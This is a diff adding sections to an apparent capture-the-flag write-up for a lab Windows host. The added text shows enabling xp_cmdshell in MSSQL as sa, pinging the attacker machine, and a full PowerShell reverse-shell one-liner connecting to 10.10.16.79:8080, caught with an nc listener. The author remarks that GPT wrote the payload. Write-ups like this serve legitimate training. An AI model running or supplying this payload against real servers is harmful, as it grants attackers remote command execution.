@@ -293,11 +293,66 @@ model
 msdb     
 ```
 
-#TODO add details about MSSQL prompt and output
+Among these tables, `msdb` is an interesting one as it maintains all user related details, services running, permission etc. So, potentially we can exploit it! Let's try.
+```sql
+SQL (sa  dbo@master)> use msdb;
+ENVCHANGE(DATABASE): Old Value: master, New Value: msdb
+INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'msdb'.
 
-## Getting reverse powershell from the MSSQL cmd
+SQL (sa  dbo@msdb)> EXEC sp_configure 'show advanced options', 1;
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 1 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@msdb)> RECONFIGURE;
+SQL (sa  dbo@msdb)> EXEC sp_configure 'xp_cmdshell', 1;
+INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (sa  dbo@msdb)> RECONFIGURE;
+```
 
+Interesting.
+So here, I selecte msdb and allow the current user to run `xp_cmdshell` commands so now I can run `powershell` commands from SQL client! Noice! Let's ping to our local client from here.
+```sql
+SQL (sa  dbo@msdb)> exec xp_cmdshell 'ping 10.10.16.79 -n 10';
+^Moutput                                                       
+----------------------------------------------------------   
+NULL                                                         
+
+Pinging 10.10.16.79 with 32 bytes of data:                   
+
+Reply from 10.10.16.79: bytes=32 time=123ms TTL=63           
+
+Reply from 10.10.16.79: bytes=32 time=42ms TTL=63            
+
+Reply from 10.10.16.79: bytes=32 time=39ms TTL=63            
+
+Reply from 10.10.16.79: bytes=32 time=40ms TTL=63            
+
+Reply from 10.10.16.79: bytes=32 time=41ms TTL=63            
+
+Reply from 10.10.16.79: bytes=32 time=40ms TTL=63            
+
+Reply from 10.10.16.79: bytes=32 time=40ms TTL=63            
+
+Reply from 10.10.16.79: bytes=32 time=147ms TTL=63           
+
+Reply from 10.10.16.79: bytes=32 time=39ms TTL=63            
+
+Reply from 10.10.16.79: bytes=32 time=197ms TTL=63
+```
+
+Nice, I can ping my local machine. So now I can just get a reverse shell (`powershell` rather :P) and try to get the flag or do privilege escalation! Hahaahahha!
+## Getting reverse `powershell` from the MSSQL 
+Attempting to get a reverse `powershell`
 ```powershell
 xp_cmdshell 'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.16.79'',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> '';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
 ```
 
+I simply ask GPT to write me the above command and voila!
+```bash
+──(truelyyours㉿kali)-[~/linkvortex_htb]
+└─$ nc -nvlp 8080
+listening on [any] 8080 ...
+connect to [10.10.16.79] from (UNKNOWN) [10.10.11.51] 64397
+
+PS C:\Windows\system32>
+```
+
+Of course, I have to run a local `nc` server and listen to a particular port.
